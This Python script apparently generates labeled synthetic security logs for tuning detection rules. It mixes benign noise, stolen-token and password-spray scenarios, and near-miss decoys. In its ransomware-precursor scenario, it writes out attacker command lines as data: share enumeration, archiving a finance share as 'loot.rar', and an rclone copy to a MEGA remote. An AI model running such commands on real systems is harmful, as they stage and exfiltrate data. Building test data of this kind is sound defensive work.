"""Seeded, labeled synthetic telemetry for measuring correlation rules.

Benign background includes the noise that makes single-event rules painful: CI bots cloning many
repos, developers creating tokens, engineers assuming roles from hotel IPs, nightly rclone backups,
admins running "net view", and constant failed password sprays that never succeed.
Attack scenarios carry a `scenario` label; near-miss benign chains carry `nearmiss` so tuning can be
judged against realistic false-positive bait.
"""
import json
import random
from datetime import datetime, timedelta, timezone

START = datetime(2026, 10, 1, tzinfo=timezone.utc)


def _t(day, hour, minute=0, second=0):
    return (START + timedelta(days=day, hours=hour, minutes=minute, seconds=second)).isoformat()


def generate(seed=7, days=14, users=300):
    rnd = random.Random(seed)
    ev = []
    devs = [f"dev{i:03d}@corp.example" for i in range(users)]
    repos = [f"corp/repo-{i:03d}" for i in range(400)]
    hosts = [f"WS-{i:04d}" for i in range(250)] + ["FS-01", "FS-02", "BKP-01"]
    office_ips = [f"10.20.{i}.{j}" for i in range(4) for j in range(1, 60)]

    for d in range(days):
        for u in devs:
            if rnd.random() < 0.6:                                   # ordinary clones
                for _ in range(rnd.randint(1, 8)):
                    ev.append({"timestamp": _t(d, rnd.randint(8, 18), rnd.randint(0, 59), rnd.randint(0, 59)), "source": "github",
                               "action": "git.clone", "actor": u, "repo": rnd.choice(repos)})
            if rnd.random() < 0.01:                                  # occasional token creation
                ev.append({"timestamp": _t(d, rnd.randint(9, 17), rnd.randint(0, 59)), "source": "github",
                           "action": "personal_access_token.create", "actor": u})
            if rnd.random() < 0.3:                                   # role assumptions, 3% from a new IP (travel)
                ev.append({"timestamp": _t(d, rnd.randint(8, 19), rnd.randint(0, 59)), "source": "aws", "eventName": "AssumeRole",
                           "actor": u, "sourceIPAddress": rnd.choice(office_ips), "enrich": {"new_ip_for_actor": rnd.random() < 0.03}})
            if rnd.random() < 0.05:                                  # typo'd passwords
                ip = rnd.choice(office_ips)
                ev.append({"timestamp": _t(d, rnd.randint(8, 18), rnd.randint(0, 59)), "source": "idp", "result": "failure", "user": u, "src_ip": ip})
            ip = rnd.choice(office_ips)
            ev.append({"timestamp": _t(d, 8, rnd.randint(0, 59)), "source": "idp", "result": "success", "user": u, "src_ip": ip})
            ev.append({"timestamp": _t(d, 9, rnd.randint(0, 59)), "source": "m365", "operation": "MailItemsAccessed", "user": u, "src_ip": ip})
        for bot in range(3):                                          # CI bots mirror many repos nightly
            for r in rnd.sample(repos, 60):
                ev.append({"timestamp": _t(d, 2, bot * 10 + rnd.randint(0, 9), rnd.randint(0, 59)), "source": "github",
                           "action": "git.clone", "actor": f"ci-bot-{bot}@corp.example", "repo": r})
        for _ in range(6):                                            # internet sprays that fail
            ip = f"203.0.113.{rnd.randint(1, 254)}"
            h = rnd.randint(0, 23)
            for u in rnd.sample(devs, rnd.randint(15, 40)):
                ev.append({"timestamp": _t(d, h, rnd.randint(0, 50), rnd.randint(0, 59)), "source": "idp", "result": "failure", "user": u, "src_ip": ip})
        for _ in range(4):                                            # admins: net view, 7-Zip
            h = rnd.choice(hosts[:250])
            ev.append({"timestamp": _t(d, rnd.randint(9, 17), rnd.randint(0, 59)), "source": "edr", "host": h, "process": "net view \\\\FS-01"})
            ev.append({"timestamp": _t(d, rnd.randint(9, 17), rnd.randint(0, 59)), "source": "edr", "host": rnd.choice(hosts[:250]),
                       "process": "7z.exe a report.7z report.docx"})
        ev.append({"timestamp": _t(d, 1, 0), "source": "edr", "host": "BKP-01", "process": "7z.exe a nightly.7z D:\\data"})   # nightly backup
        ev.append({"timestamp": _t(d, 1, 30), "source": "edr", "host": "BKP-01", "process": "rclone.exe sync D:\\out s3:corp-backups"})
        ev.append({"timestamp": _t(d, 6, 0), "source": "edr", "host": "BKP-01", "process": "net share"})

    _inject_attacks(ev, rnd, devs, repos, hosts, days)
    _inject_nearmisses(ev, rnd, devs, repos, hosts, days)
    return sorted(ev, key=lambda e: e["timestamp"])


def _inject_attacks(ev, rnd, devs, repos, hosts, days):
    for n in range(3):                                                # stolen session: token, mass clone, role from new IP
        d, u, sid = rnd.randint(1, days - 1), rnd.choice(devs), f"ATTACK-token-{n}"
        h = rnd.randint(19, 23)
        ev.append({"timestamp": _t(d, h, 0), "source": "github", "action": "personal_access_token.create", "actor": u, "scenario": sid})
        for i, r in enumerate(rnd.sample(repos, 40)):
            ev.append({"timestamp": _t(d, h, 5 + i // 4, i % 60), "source": "github", "action": "git.clone", "actor": u, "repo": r, "scenario": sid})
        ev.append({"timestamp": _t(d, h, 35), "source": "aws", "eventName": "AssumeRole", "actor": u, "sourceIPAddress": "198.51.100.23",
                   "enrich": {"new_ip_for_actor": True}, "scenario": sid})
    for n in range(3):                                                # SafePay-like precursor on a file server or workstation
        d, h, sid = rnd.randint(1, days - 1), rnd.choice(hosts[:252]), f"ATTACK-ransom-{n}"
        hr = rnd.randint(0, 20)
        ev.append({"timestamp": _t(d, hr, 0), "source": "edr", "host": h, "process": "powershell -c Invoke-ShareFinder -CheckShareAccess", "scenario": sid})
        ev.append({"timestamp": _t(d, hr, 40), "source": "edr", "host": h, "process": "winrar.exe a -hp -v500m loot.rar \\\\FS-01\\finance", "scenario": sid})
        ev.append({"timestamp": _t(d, hr + 1, 30), "source": "edr", "host": h, "process": "rclone.exe copy loot.rar mega:x --transfers 8", "scenario": sid})
    for n in range(3):                                                # spray that works, then mailbox access
        d, ip, sid = rnd.randint(1, days - 1), f"198.51.100.{100 + n}", f"ATTACK-spray-{n}"
        hr = rnd.randint(0, 22)
        victims = rnd.sample(devs, 25)
        for i, u in enumerate(victims):
            ev.append({"timestamp": _t(d, hr, i // 2, i % 60), "source": "idp", "result": "failure", "user": u, "src_ip": ip, "scenario": sid})
        ev.append({"timestamp": _t(d, hr, 20), "source": "idp", "result": "success", "user": victims[0], "src_ip": ip, "scenario": sid})
        ev.append({"timestamp": _t(d, hr, 28), "source": "m365", "operation": "MailItemsAccessed", "user": victims[0], "src_ip": ip, "scenario": sid})


def _inject_nearmisses(ev, rnd, devs, repos, hosts, days):
    for n in range(4):   # repo migration: token + many clones, but role assumed from a known office IP
        d, u = rnd.randint(1, days - 1), rnd.choice(devs)
        ev.append({"timestamp": _t(d, 10, 0), "source": "github", "action": "personal_access_token.create", "actor": u, "nearmiss": f"NM-migration-{n}"})
        for i, r in enumerate(rnd.sample(repos, 30)):
            ev.append({"timestamp": _t(d, 10, 2 + i // 3), "source": "github", "action": "git.clone", "actor": u, "repo": r, "nearmiss": f"NM-migration-{n}"})
        ev.append({"timestamp": _t(d, 10, 30), "source": "aws", "eventName": "AssumeRole", "actor": u, "sourceIPAddress": "10.20.1.5",
                   "enrich": {"new_ip_for_actor": False}, "nearmiss": f"NM-migration-{n}"})
    for n in range(4):   # developer on travel: token + a few clones + role from new IP
        d, u = rnd.randint(1, days - 1), rnd.choice(devs)
        ev.append({"timestamp": _t(d, 14, 0), "source": "github", "action": "personal_access_token.create", "actor": u, "nearmiss": f"NM-travel-{n}"})
        for i, r in enumerate(rnd.sample(repos, 6)):
            ev.append({"timestamp": _t(d, 14, 3 + i), "source": "github", "action": "git.clone", "actor": u, "repo": r, "nearmiss": f"NM-travel-{n}"})
        ev.append({"timestamp": _t(d, 14, 20), "source": "aws", "eventName": "AssumeRole", "actor": u, "sourceIPAddress": "192.0.2.80",
                   "enrich": {"new_ip_for_actor": True}, "nearmiss": f"NM-travel-{n}"})
    for n in range(3):   # small spray from a shared NAT where one real user then logs in and reads mail
        d, ip = rnd.randint(1, days - 1), f"10.99.0.{n + 1}"
        users = rnd.sample(devs, 4)
        for i, u in enumerate(users):
            ev.append({"timestamp": _t(d, 11, i), "source": "idp", "result": "failure", "user": u, "src_ip": ip, "nearmiss": f"NM-nat-{n}"})
        ev.append({"timestamp": _t(d, 11, 6), "source": "idp", "result": "success", "user": users[0], "src_ip": ip, "nearmiss": f"NM-nat-{n}"})
        ev.append({"timestamp": _t(d, 11, 9), "source": "m365", "operation": "MailItemsAccessed", "user": users[0], "src_ip": ip, "nearmiss": f"NM-nat-{n}"})


def write(path, **kw):
    events = generate(**kw)
    with open(path, "w") as f:
        for e in events:
            f.write(json.dumps(e) + "\n")
    return len(events)


if __name__ == "__main__":
    print(write("data/events.jsonl"), "events written to data/events.jsonl")
